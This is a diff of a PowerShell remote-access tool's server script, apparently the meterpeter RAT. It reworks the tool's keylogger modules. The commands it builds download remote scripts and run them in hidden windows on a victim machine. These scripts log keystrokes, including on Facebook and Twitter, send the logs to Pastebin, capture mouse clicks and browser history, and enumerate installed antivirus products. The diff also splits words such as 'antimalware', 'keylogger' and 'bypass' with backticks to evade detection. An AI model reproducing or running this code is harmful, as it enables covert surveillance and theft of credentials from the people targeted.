+            Write-Host " - Search for string (antimal`ware|sandboxing): " -NoNewline;
             $StringToSearch = Read-Host;
             If(-not($StringToSearch) -or $StringToSearch -eq $null)
             {
                write-host "   => Error: wrong input, use default strings." -ForegroundColor Red
-               $StringToSearch = "Defender|antimalware|sandboxing|Symantec|AVG|Avast|BitDefender|Comodo|Cisco|ESET|FireEye|F-Secure|Kaspersky|Malwarebytes|McAfee|Panda|Sophos|SentinelOne"
+               $StringToSearch = "Defender|antimal`ware|sandboxing|Symantec|AVG|Avast|BitDefender|Comodo|Cisco|ESET|FireEye|F-Secure|Kaspersky|Malwa`rebytes|McAfee|Panda|Sophos|SentinelOne"
             }
 
             #Execute command remote
@@ -1993,7 +2054,7 @@ While($Client.Connected)
          {
             write-host " * Listing Remote Host Counter Measures (Accurate)" -ForegroundColor Green;
             write-host "   => This function takes aprox 1 minute to finish." -ForegroundColor DarkYellow;Start-Sleep -Seconds 1
-            $StringToSearch = "Defender|antimalware|sandboxing|Symantec|AVG|Avast|BitDefender|Comodo|Cisco|ESET|FireEye|F-Secure|Kaspersky|Malwarebytes|McAfee|Panda|Sophos|SentinelOne"
+            $StringToSearch = "Defender|antima`lware|sandboxing|Symantec|AVG|Avast|BitDefender|Comodo|Cisco|ESET|FireEye|F-Secure|Kaspersky|Mal`warebytes|McAfee|Panda|Sophos|SentinelOne"
             $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1`" -outfile `"`$Env:TMP\GetCounterMeasures.ps1`"|Unblock-File;powershell -File `$Env:TMP\GetCounterMeasures.ps1 -Action Verbose -stringsearch 'true' -string `"$StringToSearch`";Remove-Item -Path `$Env:TMP\GetCounterMeasures.ps1 -Force";
          }
          If($my_choise -ieq "Return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "clear")
@@ -2105,242 +2166,398 @@ While($Client.Connected)
 
     If($Command -ieq "keylogger")
     {
-        write-host "`n`n   Description" -ForegroundColor Yellow
-        write-host "   This module captures screenshots of mouse-clicks Or,"
-        write-host "   Captures keyboard keystrokes and store them on %TMP%"
-        write-host "   Remark: Pastebin module requires 'Keystrokes' running" -ForegroundColor Yellow
-        write-host "`n`n   Modules     Description                     Remark" -ForegroundColor green;
-        write-host "   -------     -----------                     ------";
-        write-host "   Mouse       Start remote Mouse Logger       Start record remote MouseClicks"
-        write-host "   Keystrokes  Start\Stop remote keylogger     Start record remote keyStrokes";
-        write-host "   Pastebin    Send keystrokes to pastebin     Max of 20 pastes allowed by day";
-        write-host "   Browser     Capture browser(s) tab title    Start\Stop\Leak windows tab title"
-        write-host "   Clipboard   Capture clipboard strings       Start record remote clipboard"
-        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:keylogger> " -NoNewline -ForeGroundColor Green;
-        $choise = Read-Host;
-        If($choise -ieq "Clipboard")
-        {
-              Write-Host " - The Clipboard capture time in seconds (30)  : " -NoNewline
-              $CaptureTime = Read-Host
-              If([string]::IsNullOrEmpty($CaptureTime))
-              {
-                 $CaptureTime = "30"
-                 write-host "   => Error: wrong input, default to 30 (sec)" -ForegroundColor Red
-              }
+       write-host "`n`n   Description" -ForegroundColor Yellow
+       write-host "   This module captures screenshots of mouse-clicks Or,"
+       write-host "   Captures keyboard keystrokes and store them on %TMP%"
+       write-host "   Remark: Pastebin module requires 'Keystrokes' running" -ForegroundColor Yellow
+       write-host "`n`n   Modules      Description                         Remark" -ForegroundColor green;
+       write-host "   -------      -----------                         ------";
+       write-host "   Mouse        Start remote Mouse Logger           Start record remote MouseClicks"
+       write-host "   Keystrokes   Start\Stop remote keylogger         Start record remote keyStrokes";
+       write-host "   Pastebin     Send keystrokes to pastebin         Max of 20 pastes allowed by day";
+       write-host "   Browser      Capture browser(s) tab title        Start\Stop\Leak windows tab title"
+       write-host "   SocialMedia  Capture keystrokes from FB\Twitter  Start\Stop FB,Twitter keylogger"
+       write-host "   Return       Return to Server Main Menu" -ForeGroundColor yellow;
+       write-host "`n`n :meterpeter:keyl`ogger> " -NoNewline -ForeGroundColor Green;
+       $choise = Read-Host;
+       If($choise -ieq "Browser")
+       {
+          Write-Host " - Start or Stop browser keylogger? (start|stop): " -ForegroundColor Red -NoNewline
+          $Exechoise = Read-Host
+          If($Exechoise -iMatch '^(stop)$')
+          {
+             write-host ""
+             $Command = "If(Test-Path -Path `"`$Env:TMP\Browser.report`"){`$PPID = (Get-Content -Path `"`$Env:TMP\Browser.report`"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s','';If(`$PPID){echo `"Stoping Process ID: `$PPID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Stop-Process -Id `"`$PPID`" -Force;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}Else{echo `"   `> Error: fail to find keyl`oger process PID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}}Else{echo `"   NotFound: `$Env:TMP\Browser.report`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}"
+          }
+          Else
+          {
+             Write-Host " - Delay time (in seconds) between captures (3): "  -NoNewline
+             $Delay = Read-Host
+             If($Delay -lt 3)
+             {
+                write-host "   => Error: wrong input, default to 3 (sec)" -ForegroundColor Red
+             }
 
-              Write-Host " - Store files passed to the clipboard (yes|no): " -NoNewline
-              $Forensic = Read-Host
+             $StarTimer = (Get-Date -Format 'HH:mm')
+             Write-Host " - Schedule the capture start time? ($StarTimer|now): " -ForeGroundColor Red -NoNewline
+             $StartMe = Read-Host
+             If($StartMe -NotMatch '^(\d+\d+:+\d+\d)$')
+             {
+                $StartMe = "now"
+             }
 
-              ## Print OnScreen
-              write-host "`n`n   capture  : " -NoNewline
-              write-host "$CaptureTime" -ForegroundColor Red -NoNewline
-              write-host " (seconds)"
+             Write-Host " - Dump installed browsers url history? (y|n)  : " -NoNewline
+             $DumpHistory = Read-Host
+             If($DumpHistory -Match '^(y|yes)$')
+             {
+                $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -starttime $StartMe -delay $Delay -log -history -force true`";echo `"`n   `> Browser key`logger schedule to: [$StartMe] hours`";echo `"   `> Logfile: `$Env:TMP\Browser.report`""
+             }
+             Else
+             {
+                $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -starttime $StartMe -delay $Delay -log -force true`";echo `"`n   `> Browser keylo`gger schedule to: [$StartMe] hours`";echo `"   `> Logfile: `$Env:TMP\Browser.report`""           
+             }
+          }
+       }
+       If($choise -ieq "SocialMedia")
+       {
+          write-host "`n   👁‍🗨 Module description 👁‍🗨" -ForegroundColor Yellow
+          write-host "   This module starts recording keystr`okes if facebook or twitter"
+          write-host "   is active on browser tab, and it stops\resumes capture if user"
+          write-host "   switchs from social media to another website or closes browser.`n"
 
-              If($Forensic -iMatch '^(y|yes)$')
-              {
-                 write-host "   logfile  : %TMP%\Forensic\clipboard.log"
-                 write-host "   Storage  : %TMP%\Forensic\`n"
-                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Xclipboard.ps1`" -OutFile `"`$Env:TMP\Xclipboard.ps1`"|Unblock-File;cd `$Env:TMP;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file Xclipboard.ps1 -action Capture -CaptureTime $CaptureTime -Forensic -CleanUp`""
-              }
-              Else
-              {
-                 write-host "   logfile  : %TMP%\clipboard.log`n"
-                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Xclipboard.ps1`" -OutFile `"`$Env:TMP\Xclipboard.ps1`"|Unblock-File;cd `$Env:TMP;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file Xclipboard.ps1 -action Capture -CaptureTime $CaptureTime -CleanUp`""
-              }
-         }
-        If($choise -ieq "Browser")
-        {
-           Write-Host " - Start or Stop browser keyloger? (start|stop): " -ForegroundColor Red -NoNewline
-           $Exechoise = Read-Host
-           If($Exechoise -iMatch '^(stop)$')
-           {
-              write-host ""
-              $Command = "If(Test-Path -Path `"`$Env:TMP\Browser.report`"){`$PPID = (Get-Content -Path `"`$Env:TMP\Browser.report`"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s','';If(`$PPID){echo `"Stoping Process ID: `$PPID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Stop-Process -Id `"`$PPID`" -Force;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}Else{echo `"   `> Error: fail to find keyloger process PID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}}Else{echo `"   NotFound: `$Env:TMP\Browser.report`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}"
-           }
-           Else
-           {
-              Write-Host " - Delay time (in seconds) between captures (3): "  -NoNewline
-              $Delay = Read-Host
-              If($Delay -lt 3)
-              {
-                 write-host "   => Error: wrong input, default to 3 (sec)" -ForegroundColor Red
-              }
+          Write-Host " - Start or Stop browser key`logger (" -NoNewline -ForegroundColor Red
+          Write-Host "Start" -NoNewline -ForegroundColor Yellow
+          Write-Host "|" -NoNewline -ForegroundColor Red
+          Write-Host "Stop" -NoNewline -ForegroundColor Yellow
+          Write-Host "): " -NoNewline -ForegroundColor Red
 
-              $StarTimer = (Get-Date -Format 'HH:mm')
-              Write-Host " - Schedule the capture start time? ($StarTimer|now): " -ForeGroundColor Red -NoNewline
-              $StartMe = Read-Host
-              If($StartMe -NotMatch '^(\d+\d+:+\d+\d)$')
-              {
-                 $StartMe = "now"
-              }
+          $ModeChoise = Read-Host
+          If($ModeChoise -iMatch '^(Start)$')
+          {
+             ## module header
+             $CurrentTime = (Get-Date -Format 'HH:mm')
+             write-host "`n   The Run-And-LetGo function allow users to execute the module even" -ForegroundColor DarkYellow
+             write-host "   if target browser its closed and sends logfiles to pastebin server" -ForegroundColor DarkYellow
+             write-host "   if target user switchs from social media to another website (tab)`n" -ForegroundColor DarkYellow
 
-              Write-Host " - Dump installed browsers url history? (y|n)  : " -NoNewline
-              $DumpHistory = Read-Host
-              If($DumpHistory -Match '^(y|yes)$')
-              {
-                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -starttime $StartMe -delay $Delay -log -history -force true`";echo `"`n   `> Browser keylogger schedule to: [$StartMe] hours`";echo `"   `> Logfile: `$Env:TMP\Browser.report`""
-              }
-              Else
-              {
-                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -starttime $StartMe -delay $Delay -log -force true`";echo `"`n   `> Browser keylogger schedule to: [$StartMe] hours`";echo `"   `> Logfile: `$Env:TMP\Browser.report`""           
-              }
-           }
-        }
-        If($choise -ieq "Mouse")
-        {
-        
-           ## Random FileName generation
-           $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
-           $CaptureFile = "$Env:TMP\MouseCapture-" + "$Rand.zip" ## Capture File Name
-           Write-Host " - Time of capture (seconds): " -ForeGroundColor Red -NoNewline
-           [int]$Timmer = Read-Host
-           If([int]$Timmer -lt 10)
-           {
-              $Timmer = "15"
-              Write-Host "   => Error: wrong input, set demo to '$Timmer'" -ForegroundColor Red
-           }
+             Write-Host " - Key`logger execution mode (" -NoNewline -ForegroundColor Red
+             Write-Host "normal" -NoNewline -ForegroundColor Yellow
+             Write-Host "|" -NoNewline -ForegroundColor Red
+             Write-Host "LetGo" -NoNewline -ForegroundColor Yellow
+             Write-Host ") : " -NoNewline -ForegroundColor Red
 
-           #banner
-           Write-Host "`n`n   Capture      Timer     Remote Storage" -ForegroundColor Green
-           Write-Host "   -------      ------    --------------"
-           Write-Host "   MouseClicks  $Timmer(sec)   %TMP%\MouseCapture-${Rand}.zip`n"
+             $ModeSet = Read-Host
+             If($ModeSet -iMatch '^(LetGo)$')
+             {
+                $SetMeUp = "True"
+                $RawTime = (Get-Date -Format 'HH:mm')
+                Write-Host " - Schedule cmdlet execution at ($RawTime|now): " -NoNewline
+                $ForceOrNot = Read-Host
+                If($ForceOrNot -iMatch '^(now)$')
+                {
+                   ## meterpeter module output
+                   write-host "`n`n   [" -ForegroundColor Green -NoNewline
+                   write-host "$CurrentTime" -NoNewline
+                   write-host "] 👁‍🗨 Social media key`logger 👁‍🗨" -ForegroundColor Green
 
-           If(Test-Path "$Env:WINDIR\System32\psr.exe")
-           {
-              $Command = "Start-Process -WindowStyle hidden powershell -ArgumentList `"psr.exe`", `"/start`", `"/output `$Env:TMP\MouseCapture-$Rand.zip`", `"/sc 1`", `"/maxsc 100`", `"/gui 0;`", `"Start-Sleep -Seconds $Timmer;`", `"psr.exe /stop`" -EA SilentlyContinue|Out-Null"
-           }
-           Else
-           {
-              Write-Host "    => error: '$Env:WINDIR\System32\psr.exe' not found .." -ForegroundColor Red -BackgroundColor Black
-           }
-        }
-        If($choise -ieq "Keystrokes")
-        {
-           Write-Host " - Start or Stop keystrokes keyloger? (start|stop): " -ForegroundColor Red -NoNewline
-           $Exechoise = Read-Host
-           If($Exechoise -iMatch '^(stop)$')
-           {
-              ## Stop recording system keystrokes
-              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/keymanager.ps1`" -OutFile `"`$Env:TMP\KeyManager.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\KeyManager.ps1`" -Action 'Stop';Remove-Item -Path `"`$Env:TMP\KeyManager.ps1`" -Force"
-           }
-           Else
-           {
-              Write-Host " - Use PS v2 to exec keylogger? (y|n): " -ForeGroundColor Red -NoNewline
-              $UsePS2 = Read-Host
-              If($UsePS2 -iMatch '^(y|yes)$')
-              {
-                 $UsePS2 = "true"
-              }
-              Else
-              {
-                 $UsePS2 = "false"           
-              }
+                   write-host "   💀 Starting key`logger in background!"
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "SendToPasteBin  : " -NoNewline
+                   write-host "$SetMeUp" -ForegroundColor Green
 
-              ## Capture remote host keystrokes
-              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/keymanager.ps1`" -OutFile `"`$Env:TMP\KeyManager.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\KeyManager.ps1`" -Action 'Start' -UsePS2 $UsePS2;Remove-Item -Path `"`$Env:TMP\KeyManager.ps1`" -Force"
-           }
-        }
-        If($choise -ieq "PasteBin")
-        {
-           write-host "`n`n   Description" -ForegroundColor Yellow
-           write-host "   -----------"
-           write-host "   This module takes the contents of keylogger logfile (void.log)"
-           write-host "   and creates a new pastebin paste from it on the sellected account"
-           write-host "   each sellected time interval (120 sec) a max of 20 times (max pasts)"
-           write-host "   Recomended timeout: " -NoNewline;
-           write-host "3600 (one paste each hour)" -ForegroundColor Yellow -NoNewline
-           write-host " maxpastes: " -NoNewline
-           write-host "10 (max)" -ForegroundColor Yellow
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "IsBrowserActive : " -NoNewline
+                   write-host "by`pass" -ForegroundColor Green
 
-           write-host "`n`n   Modules   Description                  Remark" -ForegroundColor green;
-           write-host "   -------   -----------                  ------";
-           write-host "   Start     Send keystrokes to pastebin  max of 20 pastes allowed by day";
-           write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-           write-host "`n`n :meterpeter:keylogger:PasteBin> " -NoNewline -ForeGroundColor Green;
-           $PasteBinChoise = Read-Host;
-           If($PasteBinChoise -ieq "Start")
-           {
-              $PasteSettings = "True"
-              Write-Host " - Input PastebinUsername  : " -ForeGroundColor Red -NoNewline
-              $PastebinUsername = Read-Host
-              If($PastebinUsername -eq $null)
-              {
-                 $PasteSettings = "False"
-                 $PastebinUsername = "missing pastebin acc name"
-                 write-host "   => error: missing -PastebinUsername parameter" -ForegroundColor Red -BackgroundColor Black
-              }
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "LoopDelayTime   : " -NoNewline
+                   write-host "1200`n" -ForegroundColor Green
 
-              Write-Host " - Input PastebinPassword  : " -ForeGroundColor Red -NoNewline
-              $PastebinPassword = Read-Host
-              If($PastebinPassword -eq $null)
-              {
-                 $PasteSettings = "False"
-                 write-host "   => error: missing -PastebinPassword parameter" -ForegroundColor Red -BackgroundColor Black
-              }
+                   ## execute command 
+                   $Command = "cd `$Env:TMP;iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/SocialMedia.ps1`" -OutFile `"SocialMedia.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file SocialMedia.ps1 -mode start -force -sendtopastebin`""
+                }
+                Else
+                {
+                   $SetMeUp = "True"
+                   If(-not($ForceOrNot -match '^(\d+\d+:+\d+\d)$'))
+                   {
+                      $ForceOrNot = "now"
+                   }
 
-              Write-Host " - Max of pastes to create : " -NoNewline
-              $MaxPastes = Read-Host
-              If(-not($MaxPastes) -or $MaxPastes -eq $null)
-              {
-                 $MaxPastes = "15"
-                 write-host "   => Max value missing, defaulting to: $MaxPastes" -ForegroundColor DarkYellow
-              }
+                   Write-Host " - Cmdlet delay time [Millisecons] (1700)  : " -NoNewline
+                   $LoopDelayTime = Read-Host
+                   If([string]::IsNullOrEmpty($LoopDelayTime))
+                   {
+                      $LoopDelayTime = "1700"
+                   }
+                   
+                   If($LoopDelayTime -match 1200)
+                   {
+                      $ColorChoise = "Green"
+                   }
+                   Else
+                   {
+                      $ColorChoise = "Red"                   
+                   }
 
-              Write-Host " - Create past each xxx sec: " -NoNewline
-              $TimeOut = Read-Host
-              If($MaxPastes -gt 1)
-              {
-                 If($TimeOut -eq $null -or $TimeOut -lt 120)
-                 {
-                    $TimeOut = "120"
-                    write-host "   => TimeOut value very low, defaulting to: $TimeOut" -ForegroundColor DarkYellow
-                 }              
-              }
-              Else
-              {
-                 If($TimeOut -eq $null)
-                 {
-                    $TimeOut = "120"
-                    write-host "   => TimeOut value missing, defaulting to: $TimeOut" -ForegroundColor DarkYellow                 
-                 }              
-              }
+                   ## meterpeter module output
+                   write-host "`n`n   [" -ForegroundColor Green -NoNewline
+                   write-host "$CurrentTime" -NoNewline
+                   write-host "] 👁‍🗨 Social media key`logger 👁‍🗨" -ForegroundColor Green
 
-              write-host " * Send keystrokes to pastebin" -ForegroundColor Green
-              Write-Host "`n" #Module Banner
-              Write-Host "   Pastebin Username    : $PastebinUsername"
-              If($PastebinPassword -eq $null)
-              {
-                 Write-Host "   PasteBin password    : " -NoNewline;
-                 Write-Host "missing parameter declaration." -ForegroundColor Red -BackgroundColor Black;
-              }
-              Else
-              {
-                 Write-Host "   PasteBin password    : " -NoNewline;
-                 Write-Host "*********" -ForegroundColor Green;           
-              }
-              Write-Host "   Max Pastes To Create : $MaxPastes (max)"
-              Write-Host "   Create Paste TimeOut : each $TimeOut (seconds)"
-              Write-Host "   Keylogger File Path  : `$Env:TMP\void.log`n"
+                   write-host "   💀 Starting key`logger in background!"
+                   write-host "   ⛑️ Schedule capture to: " -NoNewline
+                   write-host "$ForceOrNot" -ForegroundColor Green -NoNewline
+                   write-host " hours."
 
-              If($PasteSettings -iMatch '^(True)$')
-              {
-                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SendToPasteBin.ps1`" -OutFile `"`$Env:TMP\SendToPasteBin.ps1`"|Unblock-file;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PastebinUsername -PastebinPassword $PastebinPassword -MaxPastes $MaxPastes -TimeOut $TimeOut -Egg true`"";
-              }
-              Else
-              {
-                 $Command = $Null;
-              }
-           }
-           Else
-           {
-              $PasteBinChoise = $null;
-              $Command = $Null;
-           }
-        }
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "SendToPasteBin  : " -NoNewline
+                   write-host "$SetMeUp" -ForegroundColor Green
+
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "IsBrowserActive : " -NoNewline
+                   write-host "byp`ass" -ForegroundColor Green
+
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "LoopDelayTime   : " -NoNewline
+                   write-host "$LoopDelayTime`n" -ForegroundColor $ColorChoise
+
+                   ## Execute command [start key`logger schedule]
+                   $Command = "cd `$Env:TMP;iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/SocialMedia.ps1`" -OutFile `"SocialMedia.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file SocialMedia.ps1 -schedule '$ForceOrNot' -mode start -delay $LoopDelayTime -force -sendtopastebin`""
+                }
+             }
+             Else
+             {
+                $SetMeUp = "False"
+                $RawTime = (Get-Date -Format 'HH:mm')
+                Write-Host " - Schedule cmdlet execution at ($RawTime|now): " -NoNewline
+                $ForceOrNot = Read-Host
+                If($ForceOrNot -iMatch '^(now)$')
+                {
+                   ## meterpeter module output
+                   write-host "`n`n   [" -ForegroundColor Green -NoNewline
+                   write-host "$CurrentTime" -NoNewline
+                   write-host "] 👁‍🗨 Social media key`logger 👁‍🗨" -ForegroundColor Green
+
+                   write-host "   💀 Starting key`logger in background!"
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "SendToPasteBin  : " -NoNewline
+                   write-host "$SetMeUp" -ForegroundColor Red
+
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "IsBrowserActive : " -NoNewline
+                   write-host "check" -ForegroundColor Red
+
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "LoopDelayTime   : " -NoNewline
+                   write-host "1200`n" -ForegroundColor Green
+
+                   ## Execute command [start key`logger normal]
+                   $Command = "cd `$Env:TMP;iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/SocialMedia.ps1`" -OutFile `"SocialMedia.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file SocialMedia.ps1 -mode start`""
+                }
+                Else
+                {
+                   $SetMeUp = "False"
+                   If(-not($ForceOrNot -match '^(\d+\d+:+\d+\d)$'))
+                   {
+                      $ForceOrNot = "now"
+                   }
+
+                   ## meterpeter module output
+                   write-host "`n`n   [" -ForegroundColor Green -NoNewline
+                   write-host "$CurrentTime" -NoNewline
+                   write-host "] 👁‍🗨 Social media key`logger 👁‍🗨" -ForegroundColor Green
+
+                   write-host "   💀 Starting key`logger in background!"
+                   write-host "   ⛑️ Schedule capture to: " -NoNewline
+                   write-host "$ForceOrNot" -ForegroundColor Green -NoNewline
+                   write-host " hours."
+
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "SendToPasteBin  : " -NoNewline
+                   write-host "$SetMeUp" -ForegroundColor Red
+
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "IsBrowserActive : " -NoNewline
+                   write-host "check" -ForegroundColor Red
+
+                   write-host "   👁️ " -ForegroundColor Green -NoNewline
+                   write-host "LoopDelayTime   : " -NoNewline
+                   write-host "1200`n" -ForegroundColor Green
+
+                   ## Execute command [start key`logger schedule]
+                   $Command = "cd `$Env:TMP;iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/SocialMedia.ps1`" -OutFile `"SocialMedia.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file SocialMedia.ps1 -schedule '$ForceOrNot' -mode start`""
+                }             
+             }
+          }
+          Else
+          {
+             write-host ""
+             If($SetMeUp -imatch '^(True)$')
+             {
+                ## Execute command [stop key`logger]
+                $Command = "If(-not(Test-Path -Path `$Env:TMP\met.pid)){echo `"``n``n   > Error: Social media key`logger not found in `$Env:COMPUTERNAME!``n`" `> `$Env:TMP\repo.log;Get-Content -Path `$Env:TMP\repo.log;Remove-Item -Path `$Env:TMP\repo.log -Force}Else{powershell -file `$Env:TMP\SocialMedia.ps1 -mode stop -sendtopastebin;`$KillFirstPID = (Get-Content -Path `$Env:TMP\met.pid);Remove-Item -Path `$Env:TMP\met.pid -Force;Stop-Process -Id `$KillFirstPID -Force;Remove-Item `$Env:TMP\SocialMedia.ps1 -Force}"
+             }
+             Else
+             {
+                ## Execute command [stop key`logger]
+                $Command = "If(-not(Test-Path -Path `$Env:TMP\met.pid)){echo `"``n``n   > Error: Social media key`logger not found in `$Env:COMPUTERNAME!``n`" `> `$Env:TMP\repo.log;Get-Content -Path `$Env:TMP\repo.log;Remove-Item -Path `$Env:TMP\repo.log -Force}Else{powershell -file `$Env:TMP\SocialMedia.ps1 -mode stop;`$KillFirstPID = (Get-Content -Path `$Env:TMP\met.pid);Remove-Item -Path `$Env:TMP\met.pid -Force;Stop-Process -Id `$KillFirstPID -Force;Remove-Item `$Env:TMP\SocialMedia.ps1 -Force}"
+             }
+          }
+       }
+       If($choise -ieq "Mouse")
+       {
+          ## Random FileName generation
+          $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
+          $CaptureFile = "$Env:TMP\MouseCapture-" + "$Rand.zip" ## Capture File Name
+          Write-Host " - Time of capture (seconds): " -ForeGroundColor Red -NoNewline
+          [int]$Timmer = Read-Host
+          If([int]$Timmer -lt 10)
+          {
+             $Timmer = "15"
+             Write-Host "   => Error: wrong input, set demo to '$Timmer'" -ForegroundColor Red
+          }
+
+          #banner
+          Write-Host "`n`n   Capture      Timer     Remote Storage" -ForegroundColor Green
+          Write-Host "   -------      ------    --------------"
+          Write-Host "   MouseClicks  $Timmer(sec)   %TMP%\MouseCapture-${Rand}.zip`n"
+
+          If(Test-Path "$Env:WINDIR\System32\psr.exe")
+          {
+             $Command = "Start-Process -WindowStyle hidden powershell -ArgumentList `"psr.exe`", `"/start`", `"/output `$Env:TMP\MouseCapture-$Rand.zip`", `"/sc 1`", `"/maxsc 100`", `"/gui 0;`", `"Start-Sleep -Seconds $Timmer;`", `"psr.exe /stop`" -EA SilentlyContinue|Out-Null"
+          }
+          Else
+          {
+             Write-Host "    => error: '$Env:WINDIR\System32\psr.exe' not found .." -ForegroundColor Red -BackgroundColor Black
+          }
+       }
+       If($choise -ieq "Keystrokes")
+       {
+          Write-Host " - Start or Stop keyst`rokes key`logger? (start|stop): " -ForegroundColor Red -NoNewline
+          $Exechoise = Read-Host
+          If($Exechoise -iMatch '^(stop)$')
+          {
+             ## Stop recording system keys`trokes
+             $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/keymanager.ps1`" -OutFile `"`$Env:TMP\KeyManager.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\KeyManager.ps1`" -Action 'Stop';Remove-Item -Path `"`$Env:TMP\KeyManager.ps1`" -Force"
+          }
+          Else
+          {
+             Write-Host " - Use PS v2 to exec key`logger? (y|n): " -ForeGroundColor Red -NoNewline
+             $UsePS2 = Read-Host
+             If($UsePS2 -iMatch '^(y|yes)$')
+             {
+                $UsePS2 = "true"
+             }
+             Else
+             {
+                $UsePS2 = "false"           
+             }
+
+             ## Capture remote host keyst`rokes
+             $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/keymanager.ps1`" -OutFile `"`$Env:TMP\KeyManager.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\KeyManager.ps1`" -Action 'Start' -UsePS2 $UsePS2;Remove-Item -Path `"`$Env:TMP\KeyManager.ps1`" -Force"
+          }
+       }
+       If($choise -ieq "PasteBin")
+       {
